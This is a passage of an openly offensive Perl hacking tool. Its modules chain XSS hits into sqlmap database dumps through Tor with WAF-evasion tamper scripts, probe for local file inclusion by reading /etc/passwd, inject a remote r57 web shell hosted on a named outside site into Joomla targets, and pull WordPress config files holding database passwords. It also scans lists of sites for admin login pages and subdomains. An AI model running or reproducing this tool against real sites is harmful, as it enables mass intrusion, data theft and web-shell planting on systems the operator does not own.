	          print color 'green';
              print "    [+] $URL\n";
	          print color RESET;
			
		      open (INFO, '>>XSS_Site_Scan.txt');
              print INFO "$URL\n";
		      close (INFO);
	        }
          }
		  finxss();
          ###############################
          ## end mtXss
        }
        ################################
        mtXss();
      } ### END NO EXPLOIT
    } ####### END NO USE LIST
	####################################
    ####### END SCAN
    finxss();
	
	##########################
	##########################
    ## Add sqlmap option
	
    $list = "XSS_Site_Scan.txt";
	if (-e $list){ 
	 
	EXPLOITVL:;
    print color 'yellow';
    print "    [+] Do You Want To sqlmap this Vulnerability? (Y/n): ";
    print color RESET;
    $sqlmaping=<STDIN>;
    chomp ($sqlmaping);
	
	  if ($sqlmaping =~ /^[Y]?$/i) {
	    USETOR:;
        print color 'yellow';
        print "    [+] Do You Want To Use Tor? (Y/n): ";
        print color RESET;
        $usetor=<STDIN>;
        chomp ($usetor);
	    if ($usetor =~ /^[Y]?$/i) {
          ###############################
	      sub sqlmaptor {
          ###############################
          open (INFO, 'XSS_Site_Scan.txt');
	      while (my $Target = <INFO>) {
	        chomp $Target;
			$Target =~ s/\%.*//s;
          print color 'yellow';
          print "    [+] Checking databases...";
          print color RESET;
		
          system("sqlmap -u $Target --random-agent --beep --level 3 --risk 2 --threads 2 --tor --check-tor --tor-type=SOCKS5 --dbs --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
		  
		  ### BEG DATABASE
		  DATABASE:; 
          print color 'yellow'; 
          print "    [+] Do You Want To Exploit DATABASE? (Y/n): ";
          print color RESET;
          $sqldatabase=<STDIN>;
          chomp ($sqldatabase);
	      if ($sqldatabase =~ /^[Y]?$/i) {
 		    DATABASENAME:;
            print color 'yellow';
            print "    [+] Enter DataBase Name: ";
            print color RESET;
            $databasename=<STDIN>;
            chomp ($databasename);
		    if (!$databasename){ 
              print color 'red';
	          print "    [+] Uppss.. you have to Enter DataBase Name!\n";
              print color RESET;
	          goto DATABASENAME;
            };
		
            print color 'yellow';
            print "    [+] Checking...";
            print color RESET;
            system("sqlmap -u $Target --random-agent --beep --level 3 --risk 2 --threads 2 --tor --check-tor --tor-type=SOCKS5 -D $databasename --tables --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
		    ### END DATABASE
		    ### BEG TABLES
		    TABLESYES:;
            print color 'yellow'; 
            print "    [+] Do You Want To Exploit Tables? (Y/n): ";
            print color RESET;
            $sqltableyes=<STDIN>;
            chomp ($sqltableyes);
		  
	        if ($sqltableyes =~ /^[Y]?$/i) {
		      TABLES:;
              print color 'yellow';
              print "    [+] Enter Table Name: ";
              print color RESET;
              $sqltables=<STDIN>;
              chomp ($sqltables);
	          if (!$sqltables){ 
                print color 'red';
	            print "    [+] Uppss.. you have to Enter Table Name!\n";
                print color RESET;
	            goto TABLES;
              };
		
              print color 'yellow';
              print "    [+] Checking DataBase Tables...";
              print color RESET;
		      system("sqlmap -u $Target --random-agent --beep --level 3 --risk 2 --threads 2 --tor --check-tor --tor-type=SOCKS5 -D $databasename -T $sqltables --columns --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
		 
		      ### END TABLES
		      ### BEG COLUMNS
		
		      COLUMNSYES:;
              print color 'yellow'; 
              print "    [+] Do You Want To Exploit Columns? (Y/n): ";
              print color RESET;
              $sqlcolyes=<STDIN>;
              chomp ($sqlcolyes);
		  
	          if ($sqlcolyes =~ /^[Y]?$/i) {
		        COLS:;
                print color 'yellow';
                print "    [+] Enter Column Name [ex: admin,users,orders]: ";
                print color RESET;
                $sqlcolumn=<STDIN>;
                chomp ($sqlcolumn);
	            if (!$sqlcolumn){ 
                  print color 'red';
	              print "    [+] Uppss.. you have to Enter Column Name!\n";
                  print color RESET;
	              goto COLS;
                };
		
                print color 'yellow';
                print "    [+] Checking Columns...";
                print color RESET;
                system("sqlmap -u $Target --random-agent --beep --level 3 --risk 2 --threads 2 --tor --check-tor --tor-type=SOCKS5 -D $databasename -T $sqltables -C $sqlcolumn --dump --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
	            }
		      }
		    }### END GET LIST
		  }### END COLUMNS
        ######################################################################
	    ##end sqlmap with tor 
	    }
      ######################################################################
	  }else{ ### IF NO USE TOR
        ######################################################################
	    ##bgn sqlmap without tor 
	    sub sqlmap {
        ######################################################################
		
          open (INFO, 'XSS_Site_Scan.txt');
	      while (my $Target = <INFO>) {  ### GET LIST
	        chomp $Target;
			$Target =~ s/\%.*//s;

            print color 'yellow';
            print "    [+] Checking databases...";
            print color RESET;
            system("sqlmap -u $Target --beep --level 3 --risk 2 --threads 2 --dbs --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
		
		    ### BEG DATABASE
		    DATABASE:; 
            print color 'yellow'; 
            print "    [+] Do You Want To Exploit DATABASE? (Y/n): ";
            print color RESET;
            $sqldatabase=<STDIN>;
            chomp ($sqldatabase);
		
	        if ($sqldatabase =~ /^[Y]?$/i) {
		      DATABASENAME:;
              print color 'yellow';
              print "    [+] Enter DataBase Name: ";
              print color RESET;
              $databasename=<STDIN>;
              chomp ($databasename);
		  
		      if (!$databasename){ 
                print color 'red';
	            print "    [+] Uppss.. you have to Enter DataBase Name!\n";
                print color RESET;
	            goto DATABASENAME;
              };
		
              print color 'yellow';
              print "    [+] Checking...";
              print color RESET;
              system("sqlmap -u $Target --beep --level 3 --risk 2 --threads 2 -D $databasename --tables --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");		
		      ### END DATABASE
		      ### BEG TABLES
		      TABLESYES:;
              print color 'yellow'; 
              print "    [+] Do You Want To Exploit Tables? (Y/n): ";
              print color RESET;
              $sqltableyes=<STDIN>;
              chomp ($sqltableyes);
		  
	          if ($sqltableyes =~ /^[Y]?$/i) {
		        TABLES:;
                print color 'yellow';
                print "    [+] Enter Table Name: ";
                print color RESET;
                $sqltables=<STDIN>;
                chomp ($sqltables);
	            if (!$sqltables){ 
                  print color 'red';
	              print "    [+] Uppss.. you have to Enter Table Name!\n";
                  print color RESET;
	              goto TABLES;
                };
		
                print color 'yellow';
                print "    [+] Checking DataBase Tables...";
                print color RESET;
                system("sqlmap -u $Target --beep --level 3 --risk 2 --threads 2 -D $databasename -T $sqltables --columns --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
		        ### END TABLES
		        ### BEG COLUMNS
		        COLUMNSYES:;
                print color 'yellow'; 
                print "    [+] Do You Want To Exploit Columns? (Y/n): ";
                print color RESET;
                $sqlcolyes=<STDIN>;
                chomp ($sqlcolyes);
	            if ($sqlcolyes =~ /^[Y]?$/i) {
		          COLS:;
                  print color 'yellow';
                  print "    [+] Enter Column Name [ex: admin,users,orders]: ";
                  print color RESET;
                  $sqlcolumn=<STDIN>;
                  chomp ($sqlcolumn);
	              if (!$sqlcolumn){ 
                    print color 'red';
	                print "    [+] Uppss.. you have to Enter Column Name!\n";
                    print color RESET;
	                goto COLS;
                  };
		
                  print color 'yellow';
                  print "    [+] Checking Columns...";
                  print color RESET;
                  system("sqlmap -u $Target --beep --level 3 --risk 2 --threads 2 -D $databasename -T $sqltables -C $sqlcolumn --dump --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
	            } ### END COLUMNS
		      }
		    }
		  }### END GET LIST
         ###########################
	     ##end sqlmap without tor 
	     }
         ###########################
		 sqlmap();
        }  # END NO TOR
      } ### END SQLMAP 
    }else{  ### HAHAHA
	  negative();
    }

    after2:;
    print color 'yellow';
    print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
    print color RESET;
    $after2=<STDIN>;
    chomp ($after2);
    if ($after2==1) {
      goto ID;
    }
    if ($after2==0) {
      print color 'red';
      print "    [!] Have A Good Time! Bye.\n";
	  print color RESET;
      exit;
    }
    if ($after2 != 1 or 0 ) {
	  print color 'red';
      print "    [!] Upsss.. Invalid Option!\n";
	  print color RESET;
      sleep(1);
      goto after2;
    }
  }


##########
#LFI
  if ($ID==3){ ### BGN ID3
    sleep (1);
    
    USELIST2:;
    print color 'yellow';
    print "    [+] Do You Want To Scan List? (Y/n): ";
    print color RESET;
    $uselist2=<STDIN>;
    chomp ($uselist2);
	
	if ($uselist2 =~ /^[Y]?$/i) {
	  LISTNAME2:;
      print color 'yellow';
      print "    [+] Enter List Name [Ex:list.txt]: ";
      print color RESET;
      $listname=<STDIN>;
      chomp ($listname);
	  if (!$listname){ 
        print color 'red';
	    print "    [+] Uppss.. you have to Enter List Name!\n";
        print color RESET;
	    goto LISTNAME2;
      };
      $listcheck = $listname;
      if (!-e $listcheck){
	    print color 'red';
		use File::Basename;
	    print "    [+] List Not Found! $listname must be in the same directory as ",basename($0),"!\n";
	    print color RESET;
		goto LISTNAME2;
	  }
      
      print color 'yellow';
      print "    [+] Please wait this can take a few minuts...";
      print color RESET;
      print" \n";
      sleep(1);
      
############################## 

      sub mlistLfi {
	     listcheklfi();
	     mlistname();
	     LFI();
############################## 

      countargets();
      forwait();
      
      open (TEXT, $listname);
	  while (my $Target = <TEXT>) { ###
	    chomp $Target;
	    if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
        sleep(1);
        print "    [+] Checking $Target\n";
        foreach $LFI(@LFI){
          my $URL = $Target.$LFI;
          my $Source = get $URL;
          die "Can not get $URL" unless defined $URL;
        
	      if ($Source =~ m/root:x:0:0:root:/i) {
	        print color 'green';
            print "    [!] $URL\n";
	        print color RESET;
            
		    open (INFO, '>>LFI_Scan.txt');
            print INFO "$URL\n";
		    close (INFO);
	      }  
        } ### END FOREACH
	  } ### END WHILE 
      finlfi();
############################## 
     } ## mlistLfi 
############################## 
      mlistLfi();
    
      
    }else{ ####### IF NO USE LIST
    #######################
      print color 'yellow';
      print "    [+] Please Enter Target [http://www.site.com/search.php?id=] \n";
      print "    [+] Target: ";
      print color RESET;
      $Target=<STDIN>;
      chomp ($Target);
      if (!$Target){ 
        print color 'red';

	    print "    [+] Uppss.. you have to set a Target!\n";
        print color RESET;
	    goto id7;
      };
	  
      if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
      print color 'yellow';
      print "    [+] Please wait this can take a few minuts...\n";
      print color RESET;
      print" \n";
      sleep(1);
      
############################## 
      sub mtLfi {
	     listcheklfi();
	     LFI();
		 Target();
############################## 
      
      foreach $LFI(@LFI){
        my $URL = $Target.$LFI;
        my $Source = get $URL;
        die "Can not get $URL" unless defined $URL;
	
	    if ($Source =~ m/root:x:0:0:root:/i) {
	      print color 'green';
          print "    [!] $URL\n";
	      print color RESET;
		  
		  open (INFO, '>>LFI_Scan.txt');
          print INFO "$URL\n";
		  close (INFO);
	    }  
      }### END FOREACH
      finlfi();
############################## 
     } ##sub mtLfi 
############################## 
      mtLfi();
      
      
    } 
    ### END NO USE LIST
    
############################## 
      sub finlfi {
############################## 
    $list = "LFI_Scan.txt";
	if (-e $list){  ### 
	  
      print" \n";
	  my $lc = 0;
	  my $file = "LFI_Scan.txt";
      open my $file, "<", "LFI_Scan.txt";
      $lc++ while <$file>;
	  print color 'green';
	  print "    [!] $lc Unique Result(s) Found!\n";
	  print color RESET;
	  close $file;
	  
	  print color 'yellow';
      print "    [+] Results saved in $Bin LFI_Scan.txt! \n";
	  print color RESET;
	}else{ 
	  print color 'red';
      print "    [+] No Lfi Found! \n";
	  print color RESET;
	} 
    print color 'red';
    print "    [!] SCAN FINISHED!\n";
    print color RESET;
	
#################################################################      
     } ## finlfi 
#################################################################
    	
    after2:;
    print color 'yellow';
    print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
    print color RESET;
    $after3=<STDIN>;
    chomp ($after3);
    if ($after3==1) {
      goto ID;
    }
    if ($after3==0) {
      print color 'red';
      print "    [!] Have A Good Time! Bye.\n";
	  print color RESET;
      exit;
    }
    if ($after3 != 1 or 0) {
	  print color 'red';
      print "    [!] Upsss.. Invalid Option!\n";
	  print color RESET;
      sleep(1);
      goto after3;
    }
  } ### END ID3
  ##########
  
  ##########
  #RFI SCAN (JOOMLA)
  if ($ID==4){
    sleep (1);
    
	shell:;
    print color 'yellow';
    print "    [+] Shell Link [Ex: http://www.site.co.uk/r57.txt]: ";
    print color 'yellow', RESET;
    $shell =<STDIN>;
    chomp ($shell);
	if (!$shell){  
      print color 'red';
	  print "    [+] Uppss.. Invalid Value!\n";
      print color RESET;
	  goto shell;
    };
    
    USELIST3:;
    print color 'yellow';
    print "    [+] Do You Want To Scan a List? (Y/n): ";
    print color RESET;
    $uselist=<STDIN>;
    chomp ($uselist);

	if ($uselist =~ /^[Y]?$/i) {
    ####################################################
	  LISTNAME3:;

      print color 'yellow';
      print "    [+] Enter List Name [Ex:list.txt]: ";
      print color RESET;
      $listname=<STDIN>;
      chomp ($listname);
	  if (!$listname){ 
        print color 'red';
	    print "    [+] Uppss.. you have to Enter List Name!\n";
        print color RESET;
	    goto LISTNAME3;
      };
      $listcheck = $listname;
      if (!-e $listcheck){
	    print color 'red';
	    print "    [+] List Not Found! $listname must be in the same directory as ",basename($0),"!\n";
	    print color RESET;
		goto LISTNAME3;
	  }
        
        print color 'yellow';
        print "    [+] please Enter Shell Link [May Can help you: http://www.mcrracecars.co.uk/images/r57.txt]";
        print "    [+] Shell: ";
        print color RESET;
        $Shell =<STDIN>;
        chomp ($Shell);
		
#################################################################      
     sub mljoomrfi {
	   listchekjoomrfi();
	   RFI();
	   mlistname();
#################################################################
        countargets();
        forwait();
      open (TEXT, $listname);
	  while (my $Target = <TEXT>) { ###
	    chomp $Target;
	    if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
		
        sleep(1);
		print" \n";        
        print "    [+] Checking $Target";
		print" \n";

        foreach $RFI(@RFI){
          my $URL =$Target.$RFI.$shell;
		  $URL =~ s/ //g;
          $request = HTTP::Request->new('GET', $URL);
          $response = $ua->request($request);
          my $Source = $response->content;

         if ($Source =~ /r57shell/ || /safe_mode/ || /Executed / || /Shell/){
	       print color 'green';
           print "    [!] $URL\n";
	       print color RESET;
           
           open (INFO, '>>Joom_RFI_Scan.txt');
           print INFO "$URL\n";
           close (INFO);
	     }
        } ### END FOREACH
      } ## END WHILE
	  
#################################################################      
     ##sub mljoomrfi
	  }
#################################################################

	  mljoomrfi();
	  
    }else{ #### IF NO USE LIST
      id4:;
      print color 'yellow';
      print "    [+] Please Enter Target [http://www.site.com] ";
      print "\n    [+] Target: ";
      print color RESET;
      $Target=<STDIN>;
      chomp ($Target);
      if (!$Target){ 
        print color 'red';
	    print "    [+] Uppss.. you have to set a Target!\n";
        print color RESET;
	    goto id4;
      };
  
      if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
      print color 'yellow';
      print "    [+] please Enter Shell Link [May Can help you: http://www.mcrracecars.co.uk/images/r57.txt]";
      print "    [+] Shell: ";
      print color RESET;
      $Shell =<STDIN>;
      chomp ($Shell);	  
	  
#################################################################      
     sub mtjoomrfi {
	   listchekjoomrfi();
	   RFI();
	   Target();
#################################################################
        forwait();
      foreach $RFI(@RFI){
        my $URL =$Target.$RFI.$shell;
		$URL =~ s/ //g;
        $request = HTTP::Request->new('GET', $URL);
        $response = $ua->request($request);
        my $Source = $response->content;

        if ($Source =~ /r57shell/ || /safe_mode/ || /Executed / || /Shell/){
	      print color 'green';
          print "    [!] $URL\n";
	      print color RESET;
          
          open (INFO, '>>Joom_RFI_Scan.txt');
          print INFO "$URL\n";
          close (INFO);
	    }
      }
	  
#################################################################      
     ##sub mtjoomrfi
	  }
#################################################################
	  mtjoomrfi();
	  
    } #### END NO USE LIST
    
	
#################################################################      
     sub finjoomrfi {
#################################################################

    $list4 = "Joom_RFI_Scan.txt";
	if (-e $list4){  ### 
	  
      print" \n";
	  my $lc = 0;
	  my $file = "Joom_RFI_Scan.txt";
      open my $file, "<", "Joom_RFI_Scan.txt";
      $lc++ while <$file>;
	  print color 'green';
	  print "    [!] $lc Unique Result(s) Found!\n";
	  print color RESET;
	  close $file;
	  
	  print color 'yellow';
      print "    [!] Results saved in $Bin Joom_RFI_Scan.txt! \n";
	  print color RESET;
	}else{ 
	  print color 'red';
      print "    [+] No Joomla Lfi Found! \n";
	  print color RESET;
	} 
    print color 'red';
    print "    [!] SCAN FINISHED!\n";
    print color RESET; 
    
#################################################################      
     ##sub finjoomrfi
	  }
#################################################################
	
    after4:;
    print color 'yellow';
    print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
    print color RESET;
    $after4=<STDIN>;
    chomp ($after4);
    if ($after4==1) {
      goto ID;
    }
    if ($after4==0) {
      print color 'red';
      print "    [!] Have A Good Time! Bye.\n";
      print color RESET;
      exit;
    }
    if ($after4 != 1 or 0) {
      print color 'red';
      print "    [!] Upsss.. Invalid Option!\n";
      print color RESET;
      sleep(1);
      goto after4;
    }
  } #### END ID 4  
  ##########
  ##########
  #ADF SCAN (WORDPRESS)
  if ($ID==5){
    sleep (1);
    
    USELIST5:;
    print color 'yellow';
    print "    [+] Do You Want To Scan a List? (Y/n): ";
    print color RESET;
    $uselist5=<STDIN>;
    chomp ($uselist5);
	if ($uselist5 =~ /^[Y]?$/i) {
    ####################################################
	  LISTNAME5:;
      print color 'yellow';
      print "    [+] Enter List Name [Ex:list.txt]: ";
      print color RESET;
      $listname=<STDIN>;
      chomp ($listname);
	  if (!$listname){ 
        print color 'red';
	    print "    [+] Uppss.. you have to Enter List Name!\n";
        print color RESET;
	    goto LISTNAME5;
      };
      $listcheck = $listname;
      if (!-e $listcheck){
	    print color 'red';
	    print "    [+] List Not Found! $listname must be in the same directory as ",basename($0),"!\n";
	    print color RESET;
		goto LISTNAME5;
	  }
#################################################################      
     sub mlwprfi {
	   listchekwplfi();
	   ADFWP();
	   mlistname();
#################################################################
        countargets();
        forwait();
        
      open (TEXT, $listname);
	  while (my $Target = <TEXT>) { ###
	    chomp $Target;
	    if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
		
        sleep(1);
		print" \n";        
        print "    [+] Checking $Target";
		print" \n";
        
        foreach $ADFWP(@ADFWP){
          my $URL = $Target.$ADFWP;
          $request = HTTP::Request->new('GET', $URL);
          $response = $ua->request($request);
          my $Source = $response->content;
          if ($response->is_success && $response->content =~ m/DB_NAME/i || m/DB_USER/i || m/localhost/i || m/DB_PASSWORD/i || m/DB_HOST/i) {
	        print color 'green';
            print '    [!] ', $response->request->uri, "\n";
	        print color RESET;
            
            open (INFO, '>>WP_ADF_Scan.txt');
            print INFO "$URL\n";
            close (INFO);
	      }
        }
      } ### END WHILE
      finwpadf();
   #################################################################      
     ##sub mlwprfi
	  }
#################################################################
   
      mlwprfi();
      
    }else{ #### IF NO USE LIST
      id5:;
      print color 'yellow';
      print "    [+] Please Enter Target [http://www.site.com] ";
      print "\n    [+] Target: ";
      print color RESET;
      $Target=<STDIN>;
      chomp ($Target);
      if (!$Target){ 
        print color 'red';
	    print "    [+] Uppss.. you have to set a Target!\n";
        print color RESET;
	    goto id5;
      };

  
#################################################################      
     sub mtwplfi {
	   listchekwplfi();
	   ADFWP();
	   Target();
#################################################################
      forwait();
      foreach $ADFWP(@ADFWP){
        my $URL = $Target.$ADFWP;
        $request = HTTP::Request->new('GET', $URL);
        $response = $ua->request($request);
        my $Source = $response->content;
        if ($response->is_success && $response->content =~ m/DB_NAME/i || m/DB_USER/i || m/localhost/i || m/DB_PASSWORD/i || m/DB_HOST/i) {
	      print color 'green';
          print '    [!] ', $response->request->uri, "\n";
          
	      print color RESET;
          open (INFO, '>>WP_ADF_Scan.txt');
          print INFO "$URL\n";
          close (INFO);
	    }
      }
      finwpadf();
#################################################################      
     ##sub mtwplfi
	  }
#################################################################
	  mtwplfi();
      
    } #### END NO USE LIST
    
#################################################################      
     sub finwpadf {
#################################################################
    
    $list = "WP_ADF_Scan.txt";
	if (-e $list){  ### 

      print" \n";
	  my $lc = 0;
	  my $file = "WP_ADF_Scan.txt";
      open my $file, "<", "WP_ADF_Scan.txt";
      $lc++ while <$file>;
	  print color 'green';
	  print "    [!] $lc Unique Result(s) Found!\n";
	  print color RESET;
	  close $file;

	  print color 'yellow';
      print "    [!] Results saved in $Bin WP_ADF_Scan.txt! \n";
	  print color RESET;
	}else{ 
	  print color 'red';
      print "    [+] No Wordpress Lfi Found! \n";
	  print color RESET;
	} 
    print color 'red';
    print "    [!] SCAN FINISHED!\n";
    print color RESET;

#################################################################      
     ##sub finwpadf
	  }
#################################################################

    after5:;
    print color 'yellow';
    print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
    print color RESET;
    $after5=<STDIN>;
    chomp ($after5);
    if ($after5==1) {
      goto ID;
    }
    if ($after5==0) {
      print color 'red';
      print "    [!] Have A Good Time! Bye.\n";
      print color RESET;
      exit;
    }
    if ($after5 != 1 or 0) {
      print color 'red';
      print "    [!] Upsss.. Invalid Option!\n";
      print color RESET;
      sleep(1);
      goto after5;
    }
  } #### END ID 5
  
  ##########
  #FIND ADMIN PAGE
  if ($ID==6){
    sleep (1);
    
    USELIST7:;
    print color 'yellow';
    print "    [+] Do You Want To Scan a List? (Y/n): ";
    print color RESET;
    $uselist7=<STDIN>;
    chomp ($uselist7);
	if ($uselist7 =~ /^[Y]?$/i) {
    
	  LISTNAME7:;
      print color 'yellow';
      print "    [+] Enter List Name [Ex:list.txt]: ";
      print color RESET;
      $listname=<STDIN>;
      chomp ($listname);
	  if (!$listname){ 
        print color 'red';
	    print "    [+] Uppss.. you have to Enter List Name!\n";
        print color RESET;
	    goto LISTNAME7;
      };
      $listcheck = $listname;
      if (!-e $listcheck){
	    print color 'red';
	    print "    [+] List Not Found! $listname must be in the same directory as ",basename($0),"!\n";
	    print color RESET;
		goto LISTNAME7;
	  }
	  
#################################################################      
     sub mladmin {
	   listchekadmin();
	   ADMIN();
	   mlistname();
#################################################################
      countargets();
      forwait();

      open (TEXT, $listname);
	  while (my $Target = <TEXT>) { ###
	    chomp $Target;
	    if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
		
		print" \n";        
        print "    [+] Checking $Target";
		print" \n";
        
        foreach $ADMIN(@ADMIN){
          my $URL =$Target.$ADMIN;
          #my $ua = LWP::UserAgent->new;
          $request = HTTP::Request->new('GET', $URL);
          $response = $ua->request($request);
          my $Source = $response->content;
	      if ((head($URL)) && ($Source =~ m/login/i || m/password/i || m/username/i || m/email/i || m/Password/i || m/cPanel/i || m/admin/i)){
            if ( $response->is_success and $response->previous ) {
	          print color 'green';
              print '    [!] ', $request->url, ' REDITECT TO: ', "\n";
	          print color RESET;
	          print color 'green';
		      print '        => ', $response->request->uri, "\n";
	          print color RESET;
	        } else {
	          print color 'green';
              print '    [!] ',$response->request->uri, "\n";
	          print color RESET;
	        }
		    $ul = $response->request->uri,;
            open (INFO, '>>Admin_page.txt');
            print INFO  "$ul\n";
	        close (INFO);
	      }
        }
		close (TXT);
	  } ### 
      finadmin();
#################################################################      
     ##sub mladmin
	  }
#################################################################

      mladmin();
    }else{ ####### IF NO USE LIST

      id6:;
      print color 'yellow';
      print "    [+] Please Enter Target [http://www.site.com] ";
      print "\n    [+] Target: ";
      print color RESET;
      $Target=<STDIN>;
      chomp ($Target);
      if (!$Target){ 
        print color 'red';
	    print "    [+] Uppss.. you have to set a Target!\n";
        print color RESET;
	    goto id6;
      };
  
#################################################################      
     sub mtadmin {
	   listchekadmin();
	   ADMIN();
	   Target();
#################################################################
      forwait();
      
      foreach $ADMIN(@ADMIN){
        my $URL = $Target.$ADMIN;
        #my $ua = LWP::UserAgent->new;
        $request = HTTP::Request->new('GET', $URL);
        $response = $ua->request($request);
        my $Source = $response->content;
	    if ((head($URL)) && ($Source =~ m/login/i || m/password/i || m/username/i || m/email/i || m/Password/i || m/cPanel/i || m/admin/i)){
          if ( $response->is_success and $response->previous ) {
	        print color 'green';
            print '    [!] ', $request->url, ' REDITECT TO: ', "\n";
	        print color RESET;
	        print color 'green';
		    print '        => ', $response->request->uri, "\n";
	        print color RESET;
	      } else {
	        print color 'green';
            print '    [!] ',$response->request->uri, "\n";
	        print color RESET;
	      }
		  $ul = $response->request->uri,;
          open (INFO, '>>Admin_page.txt');
          print INFO  "$ul\n";
	      close (INFO);
	    }
      }
      finadmin();
#################################################################      
     ##sub mtadmin
	  }
#################################################################
      mtadmin();
      
    } ####### END NO USE LIST

#################################################################      
     sub finadmin {
#################################################################

    $list = "Admin_page.txt";
	if (-e $list){ 
	  print "\n";
	  my $lc = 0;
	  my $file = "Admin_page.txt";
      open my $file, "<", "Admin_page.txt";
      $lc++ while <$file>;
	  print color 'green';
	  print "    [!] $lc Unique Result(s) Found!\n";
	  print color RESET;
	  close $file;
	  
	  print color 'green';
      print "    [!] Results saved in $Bin Admin_page.txt! \n";
	  print color RESET;
	}else{ 
	  print color 'red';
      print "    [+] No Admin Page Login Found! \n";
	  print color RESET;
	} 
    print color 'red';
    print "    [!] SCAN FINISHED!\n";
    print color RESET;
	
#################################################################      
     #sub finadmin
       }
#################################################################
    
    after6:;
    print color 'yellow';
    print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
    print color RESET;
    $after6=<STDIN>;
    chomp ($after6);
    if ($after6==1) {
      goto ID;
    }
    if ($after6==0) {
    print color 'red';
    print "    [!] Have A Good Time! Bye.\n";
    print color RESET;
    exit;
    }
    if ($after6 != 1 or 0) {
      print color 'red';
      print "    [!] Upsss.. Invalid Option!\n";
      print color RESET;
      sleep(1);
      goto after6;
    }
  }
  ####### END ADMIN PAGE
  ####### SUBDOMAINS 
  if ($ID == 7) {

    USELIST:;
    print color 'yellow';
    print "    [+] Do You Want To Scan a List? (Y/n): ";
    print color RESET;
    $uselist=<STDIN>;
    chomp ($uselist);
    ####### END CHECK USE LIST
	####### BGN LIST NAME
	if ($uselist =~ /^[Y]?$/i) {
	  LISTNAME:;
      print color 'yellow';
      print "    [+] Enter List Name [Ex:somepath/list.txt]: ";
      print color RESET;
      $listname=<STDIN>;
      chomp ($listname);
      if (!$listname){ 
        print color 'red';
	    print "    [+] Uppss.. you have to Enter List Name!\n";
        print color RESET;
	    goto LISTNAME;
      };
      $listcheck = $listname;
      if (!-e $listcheck){
	    print color 'red';
	    print "    [+] List Not Found! $listname must be in the same directory as ",basename($0),"!\n";
	    print color RESET;
		goto LISTNAME;
	  }
	  
#################################################################      
     sub mlsubdomain {
	   listcheksubdomain();
	   SUBDOMAIN();
	   mlistname();
#################################################################
      countargets();
      forwait();
      open (TEXT, $listname);
	  while (my $Target = <TEXT>) { 
	    chomp $Target;
	    if (index($Target, 'http://www.') != -1) {
	      $Target =~ s/http:\/\/www.//g;
	    }
	    if (index($Target, 'www.') != -1) {
	      $Target =~ s/www.//g;
	    }
	    print" \n";
        print "    [+] Checking $Target\n";
        print color RESET;

	    foreach $SUBDOMAIN(@SUBDOMAIN){	
	      my $URL = $SUBDOMAIN.$Target;
	      my $socket=IO::Socket::INET->new(
          PeerAddr=>"$URL",
          Proto=>'icmp',
          timeout=>1);
	      if ($socket ne "") { 
	        print color 'green';
            print "    [+] http//:$URL\n";
	        print color RESET;

		    open (INFO, '>>Subdomains_Scan.txt');
            print INFO "http//:$URL\n";
		    close (INFO);
	      }	
	    }
      }
      finsubdomain()
#################################################################      
     ##sub mlsubdomain
	  }
#################################################################
      mlsubdomain();
      
    }else{ ## IF NO LIST
	  domain:;
      print color 'yellow';
      print "    [+] Enter Domaine Name [Ex:site:com]: ";
      print color RESET;
      $Target=<STDIN>;
      chomp ($Target);
      if (!$Target){ 
        print color 'red';
	    print "    [+] Uppss.. you have to Enter a domain name!\n";
        print color RESET;
	    goto domain;
      };
	  if (index($Target, 'http://www.') != -1) {
	    $Target =~ s/http:\/\/www.//g;
	  }
	  if (index($Target, 'www.') != -1) {
	    $Target =~ s/www.//g;
	  }

#################################################################      
     sub mtsubdomain {
	   listchekadmin();
	   ADMIN();
	   Target();
#################################################################
      forwait();

	  foreach $SUBDOMAIN(@SUBDOMAIN){	
	    my $URL = $SUBDOMAIN.$Target;
	    my $socket=IO::Socket::INET->new(
        PeerAddr=>"$URL",
        Proto=>'icmp',
        timeout=>1);
	    if ($socket ne "") { 
	      print color 'green';
          print "    [+] http//:$URL\n";
	      print color RESET;

		  open (INFO, '>>Subdomains_Scan.txt');
          print INFO "http//:$URL\n";
		  close (INFO);
	    }	
	  }
      finsubdomain();
#################################################################      
     ##sub mtsubdomain 
      }
#################################################################
      mtsubdomain();
	}
	
#################################################################      
     sub finsubdomain {
#################################################################

    $list = "Subdomains_Scan.txt";
	if (-e $list){
	
      print" \n";
	  my $lc = 0;
	  my $file = "Subdomains_Scan.txt";
      open my $file, "<", "Subdomains_Scan.txt";
      $lc++ while <$file>;
	  print color 'green';
	  print "    [!] $lc Unique Result(s) Found!\n";
	  print color RESET;
	  close $file;
	  
	  print color 'yellow';
      print "    [!] Results saved in $Bin Subdomains_Scan.txt! \n";
	  print color RESET;
	}else{
      print color 'red';
      print "    [!] No Subdomains Found!\n";
      print color RESET;
	}
	  
    print color 'red';
    print "    [!] SCAN FINISHED!\n";
    print color RESET;
#################################################################      
     ## finsubdomain 
     }
#################################################################
    
    after2:;
    print color 'yellow';
    print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
    print color RESET;
    $after2=<STDIN>;
    chomp ($after2);
    if ($after2==1) {
      goto ID;
    }
    if ($after2==0) {
      print color 'red';
      print "    [!] Have A Good Time! Bye.\n";
	  print color RESET;
      exit;
    }
    if ($after2 != 1 or 0 ) {
	  print color 'red';
      print "    [!] Upsss.. Invalid Option!\n";
	  print color RESET;
      sleep(1);
      goto after2;
    }
  }
  
##########

##########
  if ($ID==8){
    goto TASKS;
  }
  #Exit
  if ($ID==9){
    print color 'red';
    print "[..][!] Have A Good Time! Bye.\n";
    print color RESET;
    exit;
  }
  ##########
